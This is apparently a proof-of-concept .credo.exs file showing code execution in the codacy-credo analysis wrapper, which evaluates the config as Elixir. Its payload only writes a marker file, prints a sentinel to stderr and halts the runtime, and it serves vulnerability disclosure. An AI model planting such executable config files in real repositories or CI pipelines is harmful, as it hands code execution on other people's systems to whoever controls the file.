# PoC payload - benign marker only. RCE via codacy-credo: the wrapper's no-patterns
# branch calls Credo.ConfigFile.read_or_default(..., "/src/") which evaluates this .credo.exs
# via Code.eval_string (Credo ExsLoader.parse, safe=false by default). Top-level Elixir runs.
marker = "/tmp/codacy-credo-rce-confirmed.txt"
cwd = File.cwd!()
File.write!(marker, "RCE confirmed via .credo.exs Code.eval_string. cwd=#{cwd} marker=#{marker}\n")

# Emit sentinel to STDERR, then HALT the BEAM immediately so the container exits fast (chosen code 78)
# and the sentinel lands in the captured step output before any timeout/OOM kills it.
IO.puts(:stderr, "CODEX_RCE_CREDO_PROOF_#{cwd}_marker_written_#{marker}")
System.halt(78)

%{configs: [%{name: "default", checks: []}]}
